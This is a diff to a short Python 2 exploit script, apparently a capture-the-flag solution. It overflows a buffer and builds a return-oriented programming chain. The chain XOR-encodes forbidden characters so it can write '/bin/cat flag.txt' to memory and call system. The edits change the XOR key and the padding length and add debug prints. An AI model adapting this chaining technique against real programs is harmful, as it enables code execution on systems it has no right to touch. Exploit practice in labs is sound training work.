@@ -36,13 +36,15 @@ def xor(c, v):
     return chr(ord(c) ^ v)
 
 def write_string_badchars(loc, st, badchars):
-    nst = ''.join(c if c not in badchars else xor(c, 32) for c in st)
+    nst = ''.join(c if c not in badchars else xor(c, 33) for c in st)
+    print map(ord, nst)
     chain = write_string(loc, nst)
     for i, c in enumerate(st):
         if c in badchars:
+            print i, c
             # need to xor
             chain += pack(xor_load)
-            chain += pack(32)
+            chain += pack(33)
             chain += pack(loc + i)
             chain += pack(xor_store)
     return chain
@@ -51,7 +53,7 @@ def main():
     data_section = 0x00601050
     system = 0x004009e8
 
-    ch = 'a' * 48
+    ch = 'a' * 40
     ch += write_string_badchars(data_section, '/bin/cat flag.txt', 'bicfns/ ')
     ch += chain([pop_rdi, data_section, system])
 
